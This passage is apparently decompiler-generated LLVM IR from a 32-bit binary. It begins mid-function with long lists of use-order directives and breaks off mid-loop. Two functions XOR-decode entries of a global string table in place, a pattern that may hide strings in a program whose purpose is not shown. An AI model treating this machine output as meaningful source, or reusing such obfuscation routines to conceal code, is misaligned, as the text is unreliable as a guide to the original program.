  uselistorder i32 %v1_804e292, { 1, 0 }
  uselistorder i32 %v0_804e292, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e27d, { 1, 0 }
  uselistorder i32 %v3_804e27a, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e317, { 1, 0 }
  uselistorder i32 %v1_804e314, { 2, 1, 0 }
  uselistorder i32 %v1_804e218, { 1, 0 }
  uselistorder i32 %v1_804e20d, { 1, 0 }
  uselistorder i32 %v0_804e20d, { 1, 0 }
  uselistorder i32 %v0_804e216, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e1ea, { 1, 0 }
  uselistorder i32 %v0_804e1ea, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v6_804e1dc, { 1, 0, 2 }
  uselistorder i32 %v4_804e19f, { 2, 1, 0 }
  uselistorder i32 %v3_804e16e, { 1, 0, 2 }
  uselistorder i32 %v0_804e0b2, { 0, 2, 1 }
  uselistorder i32 %v0_804e0a9, { 0, 3, 1, 2 }
  uselistorder i8 %v1_804e081, { 1, 0 }
  uselistorder i32 %v0_804e08a, { 1, 0 }
  uselistorder i8 %v1_804e05c, { 1, 0 }
  uselistorder i8 %v2_804e036, { 1, 5, 6, 0, 3, 4, 2 }
  uselistorder i32 %v2_804e02d, { 10, 4, 9, 6, 1, 0, 2, 3, 7, 5, 8 }
  uselistorder i32 %v5_804e02b, { 0, 5, 4, 7, 6, 2, 3, 1 }
  uselistorder i32 %v1_804e025, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804e020, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804dfd4, { 1, 0 }
  uselistorder i32 %v0_804df24, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804df1f, { 1, 0 }
  uselistorder i32 %v1_804defc, { 2, 1, 0 }
  uselistorder i32 %v0_804dee4, { 3, 5, 2, 4, 0, 1 }
  uselistorder i32 %v0_804de0f, { 2, 0, 1 }
  uselistorder i32 %v0_804ddd3, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 5, 30, 6, 37, 3, 17, 7, 8, 9, 25, 26, 27, 28, 15, 19, 20, 21, 22, 23, 38, 39, 31, 53, 0, 1, 2, 54, 4, 58, 33, 34, 32, 10, 11, 12, 13, 14, 56, 16, 59, 18, 57, 24, 60, 29, 55, 35, 36, 61, 62, 63, 64, 65, 66, 40, 41, 44, 42, 43, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32* %ecx.global-to-local, { 13, 14, 15, 16, 17, 1, 5, 6, 35, 8, 9, 4, 7, 33, 0, 10, 2, 3, 11, 12, 34, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %eax.global-to-local, { 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 132, 133, 134, 135, 136, 35, 152, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 223, 234, 235, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 9, 10, 11, 12, 13, 14, 15, 87, 88, 89, 90, 91, 92, 96, 48, 50, 49, 51, 52, 53, 54, 55, 236, 237, 238, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 78, 79, 80, 81, 82, 83, 84, 97, 98, 99, 100, 101, 95, 102, 103, 104, 105, 106, 107, 163, 164, 165, 231, 137, 138, 139, 166, 167, 168, 169, 1, 2, 3, 4, 5, 6, 7, 8, 16, 17, 140, 141, 142, 143, 144, 57, 58, 59, 60, 61, 62, 56, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 85, 86, 93, 94, 108, 109, 130, 131, 145, 146, 147, 148, 149, 150, 151, 224, 225, 226, 227, 228, 229, 230, 232, 0, 233, 170, 171, 172, 173, 221, 222, 174, 175, 176, 177, 178, 179, 180, 182, 183, 184, 185, 186, 190, 192, 191, 187, 188, 189, 181, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 46, 218, 220, 219, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217 }
  uselistorder i32 1848, { 1, 0, 2 }
  uselistorder i32 ()* @function_804f640, { 4, 1, 0, 2, 3 }
  uselistorder i32 1864, { 0, 4, 5, 12, 10, 15, 1, 2, 6, 7, 14, 3, 16, 8, 9, 13, 11 }
  uselistorder i32 ()* @function_804f0d0, { 13, 3, 2, 14, 8, 6, 12, 1, 0, 5, 4, 9, 7, 15, 11, 10 }
  uselistorder i32 ()* @function_804f0a0, { 8, 9, 3, 7, 1, 0, 4, 2, 10, 6, 5 }
  uselistorder i32 1872, { 5, 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @function_804f150, { 8, 9, 3, 7, 1, 0, 4, 2, 10, 6, 5 }
  uselistorder i8 58, { 8, 0, 1, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 ()* @function_80501e6, { 19, 18, 17, 16, 15, 14, 13, 3, 2, 21, 20, 8, 7, 0, 4, 10, 9, 6, 5, 23, 22, 12, 11, 1 }
  uselistorder i8 -5, { 2, 3, 0, 1 }
  uselistorder i8 -3, { 4, 5, 6, 3, 0, 1, 2 }
  uselistorder i32 1556, { 1, 0, 2 }
  uselistorder i32 1684, { 1, 0, 2 }
  uselistorder i32 ()* @function_804d8e0, { 3, 2, 1, 0 }
  uselistorder i32 288, { 0, 1, 3, 4, 2 }
  uselistorder i32 -28, { 1, 0, 2 }
  uselistorder i32 -24, { 1, 0, 2 }
  uselistorder i32 -20, { 1, 0, 2 }
  uselistorder i8 31, { 1, 2, 3, 0 }
  uselistorder i8 -1, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 10, { 1, 2, 3, 0 }
  uselistorder i8 127, { 1, 0 }
  uselistorder i32 ()* @function_804d6b0, { 2, 1, 0 }
  uselistorder i16* @global_var_8053116.13, { 1, 0 }
  uselistorder i8 -58, { 1, 0 }
  uselistorder i8 -87, { 2, 1, 0 }
  uselistorder i8 100, { 1, 0 }
  uselistorder i32 1852, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ef5c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ef4a, { 1, 0 }
  uselistorder label %dec_label_pc_804e415.backedge, { 22, 6, 13, 8, 16, 11, 2, 15, 1, 4, 17, 5, 19, 7, 9, 20, 10, 18, 12, 21, 14, 0, 3 }
  uselistorder label %dec_label_pc_804ee68, { 1, 0 }
  uselistorder label %dec_label_pc_804ebcd, { 1, 0 }
  uselistorder label %dec_label_pc_804eb17, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ea89, { 1, 5, 2, 7, 4, 6, 0, 3, 8 }
  uselistorder label %dec_label_pc_804ea47, { 1, 0 }
  uselistorder label %dec_label_pc_804e9e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e8cf, { 1, 0 }
  uselistorder label %dec_label_pc_804e4a0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804e832, { 1, 0 }
  uselistorder label %dec_label_pc_804e826, { 1, 0 }
  uselistorder label %dec_label_pc_804e826.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804e802, { 1, 0 }
  uselistorder label %dec_label_pc_804e7af, { 1, 0 }
  uselistorder label %dec_label_pc_804e783, { 1, 0 }
  uselistorder label %dec_label_pc_804e778, { 3, 2, 7, 4, 10, 6, 0, 8, 1, 11, 5, 9 }
  uselistorder label %dec_label_pc_804e68a, { 1, 0 }
  uselistorder label %dec_label_pc_804e67e, { 1, 0 }
  uselistorder label %dec_label_pc_804e67e.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804e65a, { 1, 0 }
  uselistorder label %dec_label_pc_804e601, { 1, 0 }
  uselistorder label %dec_label_pc_804e5bc, { 1, 0 }
  uselistorder label %dec_label_pc_804e57c, { 1, 0 }
  uselistorder label %dec_label_pc_804e536, { 1, 0 }
  uselistorder label %dec_label_pc_804e516, { 5, 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_804e4f5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e4e2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e4d0, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804e4a4, { 1, 0 }
  uselistorder label %dec_label_pc_804e4a4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804e477, { 1, 0 }
  uselistorder label %dec_label_pc_804e472, { 1, 0 }
  uselistorder label %dec_label_pc_804e430, { 1, 0 }
  uselistorder label %dec_label_pc_804e41c, { 1, 0 }
  uselistorder label %dec_label_pc_804e3fe, { 1, 0 }
  uselistorder label %dec_label_pc_804e3b2, { 5, 0, 6, 7, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_804e38a, { 1, 0 }
  uselistorder label %dec_label_pc_804e2b7, { 1, 0 }
  uselistorder label %dec_label_pc_804e283, { 3, 4, 0, 1, 5, 6, 2 }
  uselistorder label %dec_label_pc_804e236, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804e20d, { 1, 0 }
  uselistorder label %dec_label_pc_804e126, { 9, 1, 2, 3, 4, 5, 0, 6, 7, 8, 10 }
  uselistorder label %dec_label_pc_804e11b, { 1, 0 }
  uselistorder label %dec_label_pc_804e0bb, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e0a0, { 1, 0 }
  uselistorder label %dec_label_pc_804e06a, { 1, 0 }
  uselistorder label %dec_label_pc_804e020, { 6, 7, 0, 1, 2, 5, 4, 3, 8 }
  uselistorder label %dec_label_pc_804e020.preheader, { 21, 17, 20, 16, 19, 15, 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 18 }
  uselistorder label %dec_label_pc_804de6e, { 3, 0, 4, 1, 2 }
  uselistorder label %dec_label_pc_804de21, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804de0f, { 1, 2, 0 }
}

define i32 @function_804f0a0() local_unnamed_addr {
dec_label_pc_804f0a0:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v1_804f0a8 = icmp eq i32 %tmp, 0
  %v1_804f0aa = mul i32 %tmp2, 8
  store i32 %v1_804f0aa, i32* %edx.global-to-local, align 4
  br i1 %v1_804f0a8, label %dec_label_pc_804f0c3, label %dec_label_pc_804f0b9

dec_label_pc_804f0b9:                             ; preds = %dec_label_pc_804f0a0
  %v1_804f0b9 = add i32 %v1_804f0aa, add (i32 ptrtoint (i32* @global_var_80531a0.27 to i32), i32 4)
  %v2_804f0b9 = inttoptr i32 %v1_804f0b9 to i32*
  %v3_804f0b9 = load i32, i32* %v2_804f0b9, align 4
  %v1_804f0bc = urem i32 %v3_804f0b9, 65536
  %v2_804f0c1 = inttoptr i32 %tmp to i32*
  store i32 %v1_804f0bc, i32* %v2_804f0c1, align 4
  %v0_804f0c3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f0c3

dec_label_pc_804f0c3:                             ; preds = %dec_label_pc_804f0a0, %dec_label_pc_804f0b9
  %v0_804f0c3 = phi i32 [ %v1_804f0aa, %dec_label_pc_804f0a0 ], [ %v0_804f0c3.pre, %dec_label_pc_804f0b9 ]
  %v1_804f0c3 = add i32 %v0_804f0c3, ptrtoint (i32* @global_var_80531a0.27 to i32)
  %v2_804f0c3 = inttoptr i32 %v1_804f0c3 to i32*
  %v3_804f0c3 = load i32, i32* %v2_804f0c3, align 4
  ret i32 %v3_804f0c3

; uselistorder directives
  uselistorder label %dec_label_pc_804f0c3, { 1, 0 }
}

define i32 @function_804f0d0() local_unnamed_addr {
dec_label_pc_804f0d0:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_804f0d9 = zext i8 %tmp to i32
  %v1_804f0dd = mul nuw nsw i32 %v4_804f0d9, 8
  %v2_804f0dd = add i32 %v1_804f0dd, ptrtoint (i32* @global_var_80531a0.27 to i32)
  store i32 %v2_804f0dd, i32* %ecx.global-to-local, align 4
  %v0_804f0e4 = load i16, i16* @global_var_8053038.28, align 2
  %v1_804f0e4 = sext i16 %v0_804f0e4 to i32
  %v1_804f0e9 = add i32 %v1_804f0dd, add (i32 ptrtoint (i32* @global_var_80531a0.27 to i32), i32 4)
  %v2_804f0e9 = inttoptr i32 %v1_804f0e9 to i16*
  %v3_804f0e9 = load i16, i16* %v2_804f0e9, align 4
  %v4_804f0e9 = icmp eq i16 %v3_804f0e9, 0
  br i1 %v4_804f0e9, label %dec_label_pc_804f13a, label %dec_label_pc_804f0f0

dec_label_pc_804f0f0:                             ; preds = %dec_label_pc_804f0d0
  store i32 %v1_804f0e4, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804f0f8 = udiv i32 %v1_804f0e4, 16777216
  %v2_804f0fb = udiv i32 %v1_804f0e4, 256
  store i32 %v2_804f0fb, i32* %edi.global-to-local, align 4
  %v5_804f0fe = trunc i32 %v2_804f0f8 to i8
  store i8 %v5_804f0fe, i8* %stack_var_-44, align 1
  %v2_804f101 = udiv i32 %v1_804f0e4, 65536
  store i32 %v2_804f101, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f104

dec_label_pc_804f104:                             ; preds = %dec_label_pc_804f104.dec_label_pc_804f104_crit_edge, %dec_label_pc_804f0f0
  %v0_804f10a = phi i32 [ %v0_804f10a.pre, %dec_label_pc_804f104.dec_label_pc_804f104_crit_edge ], [ %v1_804f0e4, %dec_label_pc_804f0f0 ]
  %v0_804f106 = phi i32 [ %v1_804f136, %dec_label_pc_804f104.dec_label_pc_804f104_crit_edge ], [ 0, %dec_label_pc_804f0f0 ]
  %v0_804f104 = phi i32 [ %v0_804f12e, %dec_label_pc_804f104.dec_label_pc_804f104_crit_edge ], [ %v2_804f0dd, %dec_label_pc_804f0f0 ]
  %v1_804f104 = inttoptr i32 %v0_804f104 to i32*
  %v2_804f104 = load i32, i32* %v1_804f104, align 4
  %v2_804f108 = add i32 %v2_804f104, %v0_804f106
  %v1_804f10c = inttoptr i32 %v2_804f108 to i8*
  %v2_804f10c = load i8, i8* %v1_804f10c, align 1
  %v4_804f10c = trunc i32 %v0_804f10a to i8
  %v5_804f10c = xor i8 %v2_804f10c, %v4_804f10c
  store i8 %v5_804f10c, i8* %v1_804f10c, align 1
  %v0_804f10e = load i32, i32* %edx.global-to-local, align 4
  %v0_804f110 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f110 = inttoptr i32 %v0_804f110 to i32*
  %v2_804f110 = load i32, i32* %v1_804f110, align 4
  %v2_804f112 = add i32 %v2_804f110, %v0_804f10e
  %v0_804f114 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f116 = inttoptr i32 %v2_804f112 to i8*
  %v2_804f116 = load i8, i8* %v1_804f116, align 1
  %v4_804f116 = trunc i32 %v0_804f114 to i8
  %v5_804f116 = xor i8 %v2_804f116, %v4_804f116
  store i8 %v5_804f116, i8* %v1_804f116, align 1
  %v0_804f118 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f11a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f11a = inttoptr i32 %v0_804f11a to i32*
  %v2_804f11a = load i32, i32* %v1_804f11a, align 4
  %v2_804f11c = add i32 %v2_804f11a, %v0_804f118
  %v0_804f11e = load i32, i32* %esi.global-to-local, align 4
  %v1_804f120 = inttoptr i32 %v2_804f11c to i8*
  %v2_804f120 = load i8, i8* %v1_804f120, align 1
  %v4_804f120 = trunc i32 %v0_804f11e to i8
  %v5_804f120 = xor i8 %v2_804f120, %v4_804f120
  store i8 %v5_804f120, i8* %v1_804f120, align 1
  %v0_804f122 = load i32, i32* %edx.global-to-local, align 4
  %v0_804f124 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f124 = inttoptr i32 %v0_804f124 to i32*
  %v2_804f124 = load i32, i32* %v1_804f124, align 4
  %v1_804f126 = add i32 %v0_804f122, 1
  store i32 %v1_804f126, i32* %edx.global-to-local, align 4
  %v2_804f127 = add i32 %v2_804f124, %v0_804f122
  %v2_804f129 = load i8, i8* %stack_var_-44, align 1
  %v1_804f12c = inttoptr i32 %v2_804f127 to i8*
  %v2_804f12c = load i8, i8* %v1_804f12c, align 1
  %v5_804f12c = xor i8 %v2_804f12c, %v2_804f129
  store i8 %v5_804f12c, i8* %v1_804f12c, align 1
  %v0_804f12e = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f12e = add i32 %v0_804f12e, 4
  %v2_804f12e = inttoptr i32 %v1_804f12e to i32*
  %v3_804f12e = load i32, i32* %v2_804f12e, align 4
  %v1_804f131 = urem i32 %v3_804f12e, 65536
  %v1_804f136 = load i32, i32* %edx.global-to-local, align 4
  %v8_804f138 = icmp sgt i32 %v1_804f131, %v1_804f136
  br i1 %v8_804f138, label %dec_label_pc_804f104.dec_label_pc_804f104_crit_edge, label %dec_label_pc_804f13a

dec_label_pc_804f104.dec_label_pc_804f104_crit_edge: ; preds = %dec_label_pc_804f104
  %v0_804f10a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f104

dec_label_pc_804f13a:                             ; preds = %dec_label_pc_804f104, %dec_label_pc_804f0d0
  %v0_804f141 = phi i32 [ %v1_804f0e4, %dec_label_pc_804f0d0 ], [ %v1_804f131, %dec_label_pc_804f104 ]
  ret i32 %v0_804f141

; uselistorder directives
  uselistorder i32 %v1_804f136, { 1, 0 }
  uselistorder i32 %v1_804f131, { 1, 0 }
  uselistorder i32 %v0_804f12e, { 1, 0 }
  uselistorder i32 %v1_804f0e4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
}

define i32 @function_804f150() local_unnamed_addr {
dec_label_pc_804f150:
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %v4_804f159 = zext i8 %tmp to i32
  %v1_804f15d = mul nuw nsw i32 %v4_804f159, 8
  %v2_804f15d = add i32 %v1_804f15d, ptrtoint (i32* @global_var_80531a0.27 to i32)
  store i32 %v2_804f15d, i32* %ecx.global-to-local, align 4
  %v0_804f164 = load i16, i16* @global_var_8053038.28, align 2
  %v1_804f164 = sext i16 %v0_804f164 to i32
  %v1_804f169 = add i32 %v1_804f15d, add (i32 ptrtoint (i32* @global_var_80531a0.27 to i32), i32 4)
  %v2_804f169 = inttoptr i32 %v1_804f169 to i16*
  %v3_804f169 = load i16, i16* %v2_804f169, align 4
  %v4_804f169 = icmp eq i16 %v3_804f169, 0
  br i1 %v4_804f169, label %dec_label_pc_804f1ba, label %dec_label_pc_804f170

dec_label_pc_804f170:                             ; preds = %dec_label_pc_804f150
  store i32 %v1_804f164, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v2_804f178 = udiv i32 %v1_804f164, 16777216
  %v2_804f17b = udiv i32 %v1_804f164, 256
  store i32 %v2_804f17b, i32* %edi.global-to-local, align 4
  %v5_804f17e = trunc i32 %v2_804f178 to i8
  store i8 %v5_804f17e, i8* %stack_var_-44, align 1
  %v2_804f181 = udiv i32 %v1_804f164, 65536
  store i32 %v2_804f181, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f184

dec_label_pc_804f184:                             ; preds = %dec_label_pc_804f184.dec_label_pc_804f184_crit_edge, %dec_label_pc_804f170
  %v0_804f18a = phi i32 [ %v0_804f18a.pre, %dec_label_pc_804f184.dec_label_pc_804f184_crit_edge ], [ %v1_804f164, %dec_label_pc_804f170 ]
  %v0_804f186 = phi i32 [ %v1_804f1b6, %dec_label_pc_804f184.dec_label_pc_804f184_crit_edge ], [ 0, %dec_label_pc_804f170 ]
  %v0_804f184 = phi i32 [ %v0_804f1ae, %dec_label_pc_804f184.dec_label_pc_804f184_crit_edge ], [ %v2_804f15d, %dec_label_pc_804f170 ]
  %v1_804f184 = inttoptr i32 %v0_804f184 to i32*
  %v2_804f184 = load i32, i32* %v1_804f184, align 4
  %v2_804f188 = add i32 %v2_804f184, %v0_804f186
  %v1_804f18c = inttoptr i32 %v2_804f188 to i8*
  %v2_804f18c = load i8, i8* %v1_804f18c, align 1
  %v4_804f18c = trunc i32 %v0_804f18a to i8
  %v5_804f18c = xor i8 %v2_804f18c, %v4_804f18c
  store i8 %v5_804f18c, i8* %v1_804f18c, align 1
  %v0_804f18e = load i32, i32* @edx, align 4
  %v0_804f190 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f190 = inttoptr i32 %v0_804f190 to i32*
  %v2_804f190 = load i32, i32* %v1_804f190, align 4
  %v2_804f192 = add i32 %v2_804f190, %v0_804f18e
  %v0_804f194 = load i32, i32* %edi.global-to-local, align 4
  %v1_804f196 = inttoptr i32 %v2_804f192 to i8*
  %v2_804f196 = load i8, i8* %v1_804f196, align 1
  %v4_804f196 = trunc i32 %v0_804f194 to i8
  %v5_804f196 = xor i8 %v2_804f196, %v4_804f196
  store i8 %v5_804f196, i8* %v1_804f196, align 1
  %v0_804f198 = load i32, i32* @edx, align 4
  %v0_804f19a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f19a = inttoptr i32 %v0_804f19a to i32*
  %v2_804f19a = load i32, i32* %v1_804f19a, align 4
  %v2_804f19c = add i32 %v2_804f19a, %v0_804f198
  %v0_804f19e = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1a0 = inttoptr i32 %v2_804f19c to i8*
  %v2_804f1a0 = load i8, i8* %v1_804f1a0, align 1
  %v4_804f1a0 = trunc i32 %v0_804f19e to i8
  %v5_804f1a0 = xor i8 %v2_804f1a0, %v4_804f1a0
  store i8 %v5_804f1a0, i8* %v1_804f1a0, align 1
  %v0_804f1a2 = load i32, i32* @edx, align 4
  %v0_804f1a4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f1a4 = inttoptr i32 %v0_804f1a4 to i32*
  %v2_804f1a4 = load i32, i32* %v1_804f1a4, align 4
  %v1_804f1a6 = add i32 %v0_804f1a2, 1
  store i32 %v1_804f1a6, i32* @edx, align 4
  %v2_804f1a7 = add i32 %v2_804f1a4, %v0_804f1a2
  %v2_804f1a9 = load i8, i8* %stack_var_-44, align 1
  %v1_804f1ac = inttoptr i32 %v2_804f1a7 to i8*
  %v2_804f1ac = load i8, i8* %v1_804f1ac, align 1
  %v5_804f1ac = xor i8 %v2_804f1ac, %v2_804f1a9
  store i8 %v5_804f1ac, i8* %v1_804f1ac, align 1
  %v0_804f1ae = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f1ae = add i32 %v0_804f1ae, 4
  %v2_804f1ae = inttoptr i32 %v1_804f1ae to i32*
  %v3_804f1ae = load i32, i32* %v2_804f1ae, align 4
  %v1_804f1b1 = urem i32 %v3_804f1ae, 65536
  %v1_804f1b6 = load i32, i32* @edx, align 4
  %v8_804f1b8 = icmp sgt i32 %v1_804f1b1, %v1_804f1b6
  br i1 %v8_804f1b8, label %dec_label_pc_804f184.dec_label_pc_804f184_crit_edge, label %dec_label_pc_804f1ba

dec_label_pc_804f184.dec_label_pc_804f184_crit_edge: ; preds = %dec_label_pc_804f184
  %v0_804f18a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f184

dec_label_pc_804f1ba:                             ; preds = %dec_label_pc_804f184, %dec_label_pc_804f150
  %v0_804f1c1 = phi i32 [ %v1_804f164, %dec_label_pc_804f150 ], [ %v1_804f1b1, %dec_label_pc_804f184 ]
  ret i32 %v0_804f1c1

; uselistorder directives
  uselistorder i32 %v1_804f1b6, { 1, 0 }
  uselistorder i32 %v1_804f1b1, { 1, 0 }
  uselistorder i32 %v0_804f1ae, { 1, 0 }
  uselistorder i32 %v1_804f164, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80531a0.27 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_8053038.28, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80531a0.27 to i32), { 1, 2, 3, 0 }
}

define i32 @function_804f620(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f620:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804f628 = icmp eq i32 %arg2, 0
  br i1 %v1_804f628, label %dec_label_pc_804f620.dec_label_pc_804f639_crit_edge, label %dec_label_pc_804f62c

dec_label_pc_804f620.dec_label_pc_804f639_crit_edge: ; preds = %dec_label_pc_804f620
  %v0_804f639.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f639

dec_label_pc_804f62c:                             ; preds = %dec_label_pc_804f620
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804f6305 = inttoptr i32 %arg1 to i8*
  store i8 0, i8* %v3_804f6305, align 1
  %v0_804f6346 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f6347 = add i32 %v0_804f6346, 1
  store i32 %v1_804f6347, i32* %eax.global-to-local, align 4
  %v12_804f6358 = icmp eq i32 %v1_804f6347, %arg2
  %v1_804f6379 = icmp eq i1 %v12_804f6358, false
  br i1 %v1_804f6379, label %dec_label_pc_804f630.dec_label_pc_804f630_crit_edge, label %dec_label_pc_804f639

dec_label_pc_804f630.dec_label_pc_804f630_crit_edge: ; preds = %dec_label_pc_804f62c, %dec_label_pc_804f630.dec_label_pc_804f630_crit_edge
  %v1_804f63410 = phi i32 [ %v1_804f634, %dec_label_pc_804f630.dec_label_pc_804f630_crit_edge ], [ %v1_804f6347, %dec_label_pc_804f62c ]
  %v1_804f630.pre = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f630 = add i32 %v1_804f63410, %v1_804f630.pre
  %v3_804f630 = inttoptr i32 %v2_804f630 to i8*
  store i8 0, i8* %v3_804f630, align 1
  %v0_804f634 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f634 = add i32 %v0_804f634, 1
  store i32 %v1_804f634, i32* %eax.global-to-local, align 4
  %v12_804f635 = icmp eq i32 %v1_804f634, %arg2
  %v1_804f637 = icmp eq i1 %v12_804f635, false
  br i1 %v1_804f637, label %dec_label_pc_804f630.dec_label_pc_804f630_crit_edge, label %dec_label_pc_804f639

dec_label_pc_804f639:                             ; preds = %dec_label_pc_804f62c, %dec_label_pc_804f630.dec_label_pc_804f630_crit_edge, %dec_label_pc_804f620.dec_label_pc_804f639_crit_edge
  %v0_804f639 = phi i32 [ %v0_804f639.pre, %dec_label_pc_804f620.dec_label_pc_804f639_crit_edge ], [ %v1_804f6347, %dec_label_pc_804f62c ], [ %v1_804f634, %dec_label_pc_804f630.dec_label_pc_804f630_crit_edge ]
  ret i32 %v0_804f639

; uselistorder directives
  uselistorder i32 %v1_804f634, { 0, 2, 3, 1 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f639, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f630.dec_label_pc_804f630_crit_edge, { 1, 0 }
}

define i32 @function_804f640() local_unnamed_addr {
dec_label_pc_804f640:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %v7_804f655 = icmp sgt i32 %tmp9, %tmp10
  %tmp17 = icmp slt i32 %tmp10, 1
  %or.cond = or i1 %v7_804f655, %tmp17
  br i1 %or.cond, label %dec_label_pc_804f65a, label %dec_label_pc_804f664

dec_label_pc_804f65a:                             ; preds = %dec_label_pc_804f672, %dec_label_pc_804f685, %dec_label_pc_804f640
  %storemerge = phi i32 [ -1, %dec_label_pc_804f640 ], [ -1, %dec_label_pc_804f672 ], [ %v0_804f673, %dec_label_pc_804f685 ]
  ret i32 %storemerge

dec_label_pc_804f664:                             ; preds = %dec_label_pc_804f640
  %v2_804f67c = add i32 %tmp, -1
  br label %dec_label_pc_804f678

dec_label_pc_804f670:                             ; preds = %dec_label_pc_804f678
  br label %dec_label_pc_804f672

dec_label_pc_804f672:                             ; preds = %dec_label_pc_804f685, %dec_label_pc_804f670
  %v2_804f6803 = phi i32 [ %v1_804f685, %dec_label_pc_804f685 ], [ 0, %dec_label_pc_804f670 ]
  %v1_804f672 = add i32 %v0_804f672, 1
  %v1_804f673 = add i32 %v0_804f673, 1
  %v12_804f674 = icmp eq i32 %tmp10, %v1_804f672
  br i1 %v12_804f674, label %dec_label_pc_804f65a, label %dec_label_pc_804f678

dec_label_pc_804f678:                             ; preds = %dec_label_pc_804f672, %dec_label_pc_804f664
  %v0_804f672 = phi i32 [ %v1_804f672, %dec_label_pc_804f672 ], [ 0, %dec_label_pc_804f664 ]
  %v0_804f685 = phi i32 [ %v2_804f6803, %dec_label_pc_804f672 ], [ 0, %dec_label_pc_804f664 ]
  %v0_804f673 = phi i32 [ %v1_804f673, %dec_label_pc_804f672 ], [ 1, %dec_label_pc_804f664 ]
  %v3_804f67c = add i32 %v2_804f67c, %v0_804f673
  %v4_804f67c = inttoptr i32 %v3_804f67c to i8*
  %v5_804f67c = load i8, i8* %v4_804f67c, align 1
